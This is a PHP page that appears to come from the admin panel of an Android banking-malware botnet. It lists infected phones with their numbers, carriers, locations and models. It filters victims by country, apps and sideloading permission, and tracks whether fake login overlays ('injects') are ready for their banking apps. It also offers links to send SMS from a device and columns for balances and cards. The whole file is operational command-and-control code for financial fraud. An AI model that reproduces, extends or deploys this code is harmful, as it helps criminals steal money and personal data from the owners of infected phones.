<?php
error_reporting(E_ALL ^ E_NOTICE);
	include "config.php";
	
	$gi = geoip_open("assets/GeoLiteCity.dat",GEOIP_STANDARD);

	
	function generate_botton_sorn($title,$field,$html){
		$count = 0;
		if($_SESSION['sortbot']!=""){
			$json = json_decode($_SESSION['sortbot']);
			$count = count(json_decode($json->{$field}));
		}
		
		$iid = $field."".mktime();
		$html = "
			<div class=\"modal fade\" id=\"$iid\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalCenterTitle\" aria-hidden=\"true\">
			  <div class=\"modal-dialog modal-dialog-centered\" role=\"document\">
				<div class=\"modal-content\">
				  <div class=\"modal-header\">
					<h5 class=\"modal-title\" id=\"exampleModalCenterTitle\">Filter $title</h5>
					<button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">
					  <span aria-hidden=\"true\">&times;</span>
					</button>
				  </div>
				  <form action=\"\" method=\"post\">
				  <div class=\"modal-body\">
					<input type=hidden name=op value=set_sort>
					<input type=hidden name=name value=$field>
					<div class=\"form-group\">
					<select multiple id=\"inputState\" class=\"form-control\" name=data[]>
						$html
					 </select>
				  </div>
				  </div>
				  <div class=\"modal-footer\">
					<button type=\"button\" class=\"btn btn-secondary\" data-dismiss=\"modal\">Close</button>
					<button type=\"submit\" class=\"btn btn-primary\">Save changes</button>
				  </div>
				  </form>
				</div>
			  </div>
			</div>
			<button type=\"button\" class=\"btn btn-primary\" data-toggle=\"modal\" data-target=\"#$iid\">$title ($count)</button>
		";
		return $html;
	}
	
	
	
	$sql = "";
	
	if($_POST['op']=="set_sort"){
		$json = json_decode($_SESSION['sortbot']);
		$json->{$_POST['name']}=json_encode($_POST['data']);
		$_SESSION['sortbot'] = json_encode($json);
		header("Location: list.php");
		die;
	}
	
	if($_GET['op']=="clear_sort"){
		$_SESSION['sortbot']="";
		header("Location: list.php");
		die();
	}
	
	if($_GET['op']=="filter_app"){
		$_SESSION['sortbot']="";
		$apps = $_GET['name'];
		$json = "";
		$json->apps = json_encode(array($apps));
		$_SESSION['sortbot']=json_encode($json);
		header("Location: list.php");
		die();
	}
	
	if($_GET['op']=="set_filter"){
		$_SESSION['sortbot']="";
		$name = $_GET['name'];
		$value = $_GET['value'];
		$json = "";
		$json->{$name} = json_encode(array($value));
		$_SESSION['sortbot']=json_encode($json);
		header("Location: list.php");
		die();
	}
	
	$sqlf = "select count(*) from bots where fav='1';";
	$numfav = 0;
	$resf = $dbm->query($sqlf);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($resf)) {
			$numfav = $row[0];
		}
	}
	
	$ver = get_user_param("admin_ver");
	if($ver!=$kernel['ver']){
		set_user_param("admin_ver",$kernel['ver']);
		notification_add("Install new admin version ".$kernel['ver'],"",1);
	}
	
	print_header();
	print_menu();
	
	//var_dump($_SESSION);

//////////////////////////////////////////////////////////////////////////////////////////// sort button	
	
	$html .= "<script>
						
						function copy(data){
							var inp =document.createElement('input');
							document.body.appendChild(inp);
							inp.value =data;
							inp.select();
							document.execCommand('copy',false);
							inp.remove();
						}
						</script>";
	
	$cs = "<option selected value=all>Choose country...</option>";				
	$sql1 = "select country from bots where bot_user_id='".$kernel['userid']."' GROUP BY country";
	$res = $dbm->query($sql1);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			if($row[0]!="")
			$cs .="<option value=".$row[0].">".$row[0]."</option>";
		}
	}
	$html .= generate_botton_sorn("country","country",$cs);
///////////////////////////////
	$cs = "<option selected value=all>Choose OS...</option>";	
	$sql1 = "select os_type from bots where bot_user_id='".$kernel['userid']."' GROUP BY os_type";
	$res = $dbm->query($sql1);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			if($row[0]!="")
			$cs .="<option value=".$row[0].">".$row[0]."</option>";
		}
	}
	$html .= generate_botton_sorn("OS","os_type",$cs);
///////////////////////////////
	$cs = "<option selected value=all>Choose OS version...</option>";	
	$sql1 = "select os_ver from bots where bot_user_id='".$kernel['userid']."' GROUP BY os_ver";
	$res = $dbm->query($sql1);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			//var_dump($row);
			if($row[0]!="")
			$cs .="<option value=".$row[0].">".$row[0]."</option>";
		}
	}
	$html .= generate_botton_sorn("OS version","os_ver",$cs);
//////////////////////////////
	$cs = "<option selected value=all>Choose lang...</option>";			
	$sql1 = "select os_lang from bots where bot_user_id='".$kernel['userid']."' GROUP BY os_lang";
	$res = $dbm->query($sql1);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			//var_dump($row);
			if($row[0]!="")
			$cs .="<option value=".$row[0].">".$row[0]."</option>";
		}
	}
	$html .= generate_botton_sorn("OS lang","os_lang",$cs);
//////////////////////////////
	$cs = "<option selected value=all>Choose bot type...</option>";			
	$sql1 = "select bot_type from bots where bot_user_id='".$kernel['userid']."' GROUP BY bot_type";
	$res = $dbm->query($sql1);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			//var_dump($row);
			if($row[0]!=""){
				if($row[0]=="0")$cs .="<option value=".$row[0].">bot</option>";
				if($row[0]=="1")$cs .="<option value=".$row[0].">loader</option>";
			}
		}
	}
	$html .= generate_botton_sorn("Bot type","bot_type",$cs);
/////////////////////////////
	$apps = array();
	$cs = "<option selected value=all>Choose apps...</option>";			
	$sql1 = "select apps from apps";
	$res = $dbm->query($sql1);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			//var_dump($row);
			//if($row[0]!="")
			$appd = json_decode($row[0]);
			//var_dump();
			for($i=0;$i<count($appd);$i++){
				$apps[$appd[$i]->name] = 1;
			}
			//$cs .="<option value=".$row[0].">".$row[0]."</option>";
		}
	}
	foreach($apps as $key=>$app){
		$cs .="<option value=".$key.">".$key."</option>";
	}
	//var_dump($apps);
	$html .= generate_botton_sorn("apps","apps",$cs);
//////////////////////////////
	$cs = "<option selected value=all>Choose category...</option>";			
	foreach($bot_category as $key=>$bc){
		$cs .="<option value=".$key.">".$bc."</option>";
	}
	$html .= generate_botton_sorn("Category","category",$cs);
////////////////////////////
	$cs = "<option selected value=all>Choose online...</option>";	
	$cs .= "<option value=now>now</option>";	
	$cs .= "<option value=today>today</option>";			
	$html .= generate_botton_sorn("online","online",$cs);
////////////////////////////
	$cs = "<option selected value=all>Choose fav...</option>";	
	$cs .= "<option value=1>fav</option>";			
	$html .= generate_botton_sorn("favority","fav",$cs);
////////////////////////////
$cs = "<option selected value=all>Choose permission...</option>";	
$cs .= "<option value=eus>Enabled unknown sources</option>";			
$html .= generate_botton_sorn("permission","bot_permission",$cs);
////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	$html .="
			<!--<div class=\"col-auto\">-->
				<button type=\"button\" class=\"btn btn-warning\" data-toggle=\"modal\" data-target=\"#CommandModalCenter\">Add Command (".get_count_filter().")</button>
				<button type=\"button\" class=\"btn btn-danger\" onclick=\"location.href='list.php?op=clear_sort';\">Clear filters</button>
			<!--</div>--><br><br>
    
	<table class=\"table table-sm\">
    <thead class=\"thead-inverse\">
      <tr>
		<th>T</th>
		<th>C</th>
        <th><i class=\"fa fa-calendar-plus-o\"></i></th>
        <th>BID</th>
        <!--<th>Ver</th>-->
        <th>Number</th>
        <th>Phone provider</th>
        <!--<th>IP</th>-->
        <th>Location</th>
        <th>Model</th>
        <!--<th>OS</th>-->
        <th>OS version</th>
        <!--<th>OS lang</th>-->
        <th>Balances</th>
        <th>Info</th>
      </tr>
    </thead>
    <tbody>";
      
    $sql = "select * from bots where bot_user_id='".$kernel['userid']."' ORDER BY id DESC";  
	$res = $dbm->query($sql);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			$flag_show = false;
			if(check_sort_bot($row)==true && $_SESSION['sortbot']!=""){
				$flag_show=true;
			}else if($_SESSION['sortbot']==""){
				$flag_show=true;
			}
			if($flag_show){
				
				$t = time();
				if(($t-$row[5])<300){
					$html.= "<tr class=\"table-success\">";
				}else{
					$html.= "<tr>";
				}
				if($row[18]==0){
					$html.= "<th bgcolor=green>B</th>";
				}else{
					$html.= "<th bgcolor=red>L</th>";
				}
				$html.= " 
					<th>*</th>
				";
				if($row[5]>$kernel['time_online']){
					$html.= "<th><i class=\"fa fa-calendar-plus-o\" data-toggle=\"tooltip\" data-placement=\"right\" title=\"online\"></i></th>";
				}else{
					$html.= "<th><i class=\"fa fa-calendar-plus-o\" data-toggle=\"tooltip\" data-placement=\"right\" title=\"".new_time($row[5])."\"></i></th>";
				}
				
				$fc = "black";
				if($row[6]!=$kernel['botver']){$fc="red";}
				$html.= "
					<th>".get_link_bot($row[1])." <font color=$fc><i class=\"fa fa-building\" data-toggle=\"tooltip\" data-placement=\"right\" title=\"".$row[6]."\"></i></font></th>
					<!--<th>".$row[6]."</th>-->
					<th>".$row[14]." <a href=# onclick=copy('".$row[14]."');><i class=\"fa fa-copy\"></i></a></th>
					<th>".$row[13]."</th>
					<!--<th>".$row[10]."</th>-->
					<th><a target=_blank href=\"https://dig.whois.com.au/ip/".$row[10]."\"><img src=\"/assets/country/".$row[15].".png\" title=\"".$row[10]."\"></a> <a href=\"list.php?op=set_filter&name=country&value=".$row[15]."\">".$row[15]."</a></th>
					<th>".$row[11]."</th>
					<!--<th>".$row[2]."</th>-->
					<th><font color=green><i class=\"fa fa-android\" data-toggle=\"tooltip\"></i></font> ".$row[4]." (<a href=\"list.php?op=set_filter&name=os_lang&value=".$row[3]."\">".$row[3]."</a>)</th>
					<!--<th><a href=\"list.php?op=set_filter&name=os_lang&value=".$row[3]."\">".$row[3]."</a></th>-->
					<th>none</th>
					";
					
					$html .= "<th>";
					if($row['needactivate']=="1"){
						$html .= "<a href=ajax.php?bid=".$row[1]."&op=activate>activate</a>";
					}else{
						if($row[16]==0){
							$html .= "<a href=\"ajax.php?op=addfav&bid=".$row[1]."\"><i class=\"fa fa-star-o\"></i></a> ";
						}else{
							$html .= "<a href=\"ajax.php?op=remfav&bid=".$row[1]."\"><i class=\"fa fa-star\"></i></a> ";
						}
						
						$html .= "<a href=\"bot.php?id=$row[1]&op=showform&query=sendsms\"><i class=\"fa fa-mail-forward\" data-toggle=\"tooltip\" data-placement=\"left\" title=\"send sms\"></i></a> ";
						
						
						$bapps = get_apps_bot($row[1]);
						$appsInj = get_list_injects();
						$find_inj = array_intersect_key($bapps,$appsInj);
						$listinj = "";
						if(count($find_inj)>0){
							foreach($find_inj as $key=>$fi){
								$listinj = "<a href='list.php?op=filter_app&name=".$key."'>".$key. "</a><br>";
							}
						}else{
							$listinj = "none";
						}
						
						$fc = "black";
						if(count($find_inj)>0){$fc="green";}
						$html .= "<font color=$fc><i class=\"fa fa-desktop\" data-toggle=\"tooltip\" data-delay=1000 data-html=\"true\" data-placement=\"left\" title=\"".$listinj."\"></i></font> ";
						
						
						if(substr($row[8],3,1)=="1"){
							$html .= "<font color=red><i class=\"fa fa-eject\" data-toggle=\"tooltip\" data-placement=\"left\" title=\"wait inject\"></i></font> ";
						}else{
							$html .= "<font color=green><i class=\"fa fa-eject\" data-toggle=\"tooltip\" data-placement=\"left\" title=\"free inject\"></i></font> ";
						}
						
						$html .= "<font color=green><i class=\"fa fa-lock\" data-toggle=\"tooltip\" data-placement=\"left\" title=\"unlocked\"></i></font> ";
						
						$html .= "<font color=black><i class=\"fa fa-credit-card\" data-toggle=\"tooltip\" data-placement=\"left\" title=\"no card\"></i></font> ";
						
						
						$html .= "<a href=\"list.php?op=set_filter&name=category&value=".$row[12]."\"><i class=\"fa fa-cube\" data-toggle=\"tooltip\" data-placement=\"left\" title=\"Category: ".$bot_category[$row[12]]."\"></i></a> ";
					}
					
				$hmtl .="</th></tr>
				";	
				
				//$html .= $row['needactivate'];
				
			}
		}
	}
      
    $html.="</tbody>
  </table>
	";
	geoip_close($gi);
	print_content("Bot listing",$html);
	
	print_footer();

?>
